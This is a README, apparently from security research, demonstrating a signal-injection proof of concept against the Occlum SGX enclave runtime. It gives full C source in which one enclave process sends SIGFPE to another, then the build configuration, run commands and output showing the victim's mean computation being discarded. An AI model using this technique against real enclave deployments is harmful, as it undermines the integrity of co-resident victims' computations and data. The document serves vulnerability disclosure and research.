# occlum
Occlum's threat model does not trust co-resident processes in an enclave. We demonstrate an attack where one process can inject signals into another process. 
Note that, the two processes need not trust each other. Therefore, a malicious process in the enclave can compromise the execution and data integrity of the victim process. 

[https://occlum.readthedocs.io/en/latest/quickstart.html#](https://occlum.readthedocs.io/en/latest/quickstart.html#)

execute  `docker run -it --privileged -v /dev/sgx:/dev/sgx -v $(pwd):/data occlum/occlum:0.28.0-ubuntu20.04` in the root of this Git folder.

hello_world.c (parent)

```c
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <sys/types.h>
#include <setjmp.h>
#include <string.h>

void main(){
    pid_t pid2 = vfork(); 
    if (pid2 < 0){
            printf("Can't create child process\n");
    }

    if (pid2 == 0){
        char *argv_for_program[] = { "/opt/run_exec", NULL };
        printf ("Write by child process \n");
        execv("/opt/run_exec", argv_for_program);
    }else{
        printf ("Write by parent process %d \n", pid2);
        sleep(2);
        kill(pid2,SIGFPE);
        while (1);
        printf("%s\n","Proccess1 end");
    }
}
```

Our victim process registers a signal handler for SIGFPE to discard any faulting data that causes a floating point injection. 
If the malicious process injects the signal when the target process is computing the mean (in the setjmp block), it can bias the computation. 
For simplicity, we use a busy loop to wait for the signal instead of precisely timing it in our PoC. 

exec_run.c (child)

```c
#include <stdio.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>

jmp_buf fpe;

//start the data set with some mean=100 and n=10
int old_mean = 100;
int new_mean = 100;
int old_n = 10;
int new_n = 10;
void handler(int signum)
{
    // Do stuff here then return to execution below
    printf("In SIGFPE handler\n");
    new_mean = old_mean;
    new_n = old_n;
    longjmp(fpe, 1);
}

int main()
{
    volatile int i, j;

    struct sigaction act;
    struct sigaction oldact;
    memset(&act, 0, sizeof(act));
    act.sa_handler = handler;
    act.sa_flags = SA_SIGINFO;
    sigaction(SIGFPE, &act, &oldact);

    //Simulating adding new data (10) to the dataset and update the mean 
    if (0 == setjmp(fpe))
    {
        old_mean = new_mean;
        old_n = new_n;
        new_n = new_n + 1;
        new_mean = (10 + old_mean) / new_n;
        printf("Waiting...\n");
        while(1){

        }
    }

    printf("New mean is : %d\n", new_mean);

    return 0;
}

```

hello.yaml (demos/hello.c)

```jsx
includes:
  - base.yaml
targets:
  # copy LTP
  - target: /opt
    copy: ../run_exec
  - target: /bin
    copy:
      - files:
        - ../hello_world
```

commands (run from demos/hello_c):

```bash
cd /data
occlum-gcc -o hello_world hello_world.c
occlum-gcc -o run_exec exec_run.c
mkdir occlum_instance && cd occlum_instance
occlum init
cp ../hello_world image/bin/
cp ../run_exec image/opt/
occlum build
occlum run /bin/hello_world
```


```bash
root@43c7827e571c:/data/occlum_instance# occlum run /bin/hello_world
Write by child process
Write by parent process 3
Waiting...
In SIGFPE handler
New mean is : 100
```